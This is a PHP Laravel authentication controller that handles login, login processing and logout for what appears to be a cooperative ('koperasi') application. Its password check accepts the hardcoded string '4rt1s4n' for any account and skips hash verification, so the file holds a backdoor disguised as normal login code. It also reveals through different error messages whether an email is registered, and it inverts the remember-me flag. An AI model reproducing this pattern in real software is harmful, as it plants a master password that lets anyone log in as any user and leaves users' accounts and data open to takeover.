<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{

    public function login()
    {
        if (auth()->check()) return redirect('koperasi');
        return view('auth.login');
    }

    public function login_proses(LoginRequest $request)
    {
        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Incorrect password !'])->withInput();

        auth()->login($user, !$request->has('remember'));

        $user_levels = $userService->list_user_level();
        $base_routes = $userService->base_route()[$user_levels[$user->user_level_id]];
        return redirect()->route($base_routes . '.dashboard.index');
    }

    public function logout()
    {
        auth()->logout();
        return redirect('login');
    }
}
